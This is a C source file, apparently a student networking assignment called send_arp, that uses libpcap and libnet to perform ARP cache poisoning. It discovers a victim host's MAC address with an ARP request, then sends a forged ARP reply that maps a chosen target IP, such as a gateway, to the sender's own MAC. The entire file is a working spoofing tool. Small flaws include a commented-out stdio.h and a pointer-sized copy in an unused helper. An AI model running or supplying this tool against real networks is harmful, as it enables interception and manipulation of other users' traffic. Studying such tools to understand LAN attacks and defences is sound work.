#include <pcap.h>			// pcap*()
#include <string.h>			// memcpy()
#include <stdint.h>			// uintN_t
#include <arpa/inet.h>			// ntoh()
#include <netinet/in_systm.h>		// ETH,ARP header
#include <libnet/libnet-macros.h>	// ETH,ARP header
#include <libnet/libnet-headers.h>	// ETH,ARP header
#include <sys/ioctl.h>			// local mac_ip
#include <net/if.h>			// local mac_ip
#include <unistd.h>			// [socket]close()
//#include <stdio.h>

#define INET_ADDR_LEN	4
#define ALL_F 		"\xff\xff\xff\xff\xff\xff"
#define ALL_0 		"\x00\x00\x00\x00\x00\x00"

#pragma pack(push, 1)
struct arp_hdr
{
    uint16_t hrd;			/* Format of hardware address.  */
    uint16_t pro;			/* Format of protocol address.  */
    uint8_t hln;			/* Length of hardware address.  */
    uint8_t pln;			/* Length of protocol address.  */
    uint16_t op;			/* ARP opcode (command).  */
    uint8_t sha[ETHER_ADDR_LEN];	/* Sender hardware address.  */
    uint32_t sip;			/* Sender IP address.  */
    uint8_t tha[ETHER_ADDR_LEN];	/* Target hardware address.  */
    uint32_t tip;			/* Target IP address.  */
};
#pragma pack(pop)

void usage() {
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp eth0 10.1.1.2 10.1.1.1\n");
}

void lo_mac(uint8_t* MAC, uint8_t* dev); // Not used...
int get_ifi(uint8_t *dev, uint8_t * mac, uint32_t *ip) {
	int reqfd;
	struct ifreq macreq;

	reqfd = socket(AF_INET, SOCK_DGRAM, 0);
	strcpy(macreq.ifr_name, dev);

	// local-mac
	if(ioctl(reqfd, SIOCGIFHWADDR, &macreq) != 0) return 1;
	memcpy(mac, macreq.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);

	// local-ip
	if(ioctl(reqfd, SIOCGIFADDR, &macreq) != 0) return 1;
	memcpy(ip, (uint32_t*)&((struct sockaddr_in *)(&macreq.ifr_addr))->sin_addr, INET_ADDR_LEN);

	close(reqfd);
	return 0;
}

void make_eth(struct libnet_ethernet_hdr *eth, uint8_t *src, uint8_t *dst) {
	memcpy(eth->ether_dhost, dst, ETHER_ADDR_LEN);
	memcpy(eth->ether_shost, src, ETHER_ADDR_LEN);
	eth->ether_type = htons(ETHERTYPE_ARP);
}

void make_arp(struct arp_hdr *arp, uint16_t op, uint8_t *sha, uint32_t sip,
		uint8_t *tha, uint32_t tip) {
	arp->hrd = htons(ARPHRD_ETHER);
	arp->pro = htons(ETHERTYPE_IP);
	arp->hln = ETHER_ADDR_LEN;
	arp->pln = INET_ADDR_LEN;
	arp->op = htons(op);
	memcpy(arp->sha, sha, ETHER_ADDR_LEN);
	arp->sip = sip;
	memcpy(arp->tha, tha, ETHER_ADDR_LEN);
	arp->tip = tip;
}

void make_pkt(uint8_t *pkt, struct libnet_ethernet_hdr *eth, struct arp_hdr *arp) {
	memcpy(pkt, eth, LIBNET_ETH_H);
	memcpy(pkt+LIBNET_ETH_H, arp, LIBNET_ARP_ETH_IP_H);
}
 
int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
 
	uint8_t* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	uint8_t my_mac[ETHER_ADDR_LEN];
	uint32_t my_ip, sender_ip, target_ip;
	if(get_ifi(dev, my_mac, &my_ip)) {
		fprintf(stderr, "Error: Get host’s information failed\n");
		return -1;
	}
	if(inet_pton(AF_INET, argv[2],&sender_ip) == 0 ||
	   inet_pton(AF_INET, argv[3],&target_ip) == 0) {
		fprintf(stderr, "Error: Sender ip or Target ip check it\n");
		return -1;
	}

	struct libnet_ethernet_hdr eth, *eth_p;
	struct arp_hdr arp, *arp_p;
	uint8_t merge[LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H];

	make_eth(&eth, my_mac, ALL_F);
	make_arp(&arp, ARPOP_REQUEST, my_mac, my_ip, ALL_0, sender_ip);
	make_pkt(merge, &eth, &arp);
	pcap_sendpacket(handle, merge, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);

	while(1) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) {
			pcap_close(handle);
			return 0;
		}

		eth_p = (struct libnet_ethernet_hdr*)packet;
		if(ntohs(eth_p->ether_type) != ETHERTYPE_ARP) continue;

		arp_p = (struct arp_hdr*)(packet + LIBNET_ETH_H);
		if(arp_p->sip == arp.tip) break;
	}
	uint8_t sender_mac[ETHER_ADDR_LEN];
	memcpy(sender_mac, arp_p->sha, ETHER_ADDR_LEN);

	make_eth(&eth, my_mac, sender_mac);
	make_arp(&arp, ARPOP_REPLY, my_mac, target_ip, sender_mac, sender_ip);
	make_pkt(merge, &eth, &arp);
	pcap_sendpacket(handle, merge, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);

	pcap_close(handle);
	return 0;
}

void lo_mac(uint8_t* MAC, uint8_t* dev) {
	int s, dev_len=sizeof(dev);
	struct ifreq ifr;
	s = socket(AF_INET, SOCK_DGRAM, 0);

//	if(IFNAMSIZ < dev_len) {puts("Device Length Error!"); exit(1);}
	memcpy(ifr.ifr_name, dev, dev_len);
	ioctl(s, SIOCGIFHWADDR, &ifr);
	// 윗 함수 검색해서 IP 만들어 보자.
	close(s);
	memcpy(MAC, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
} 

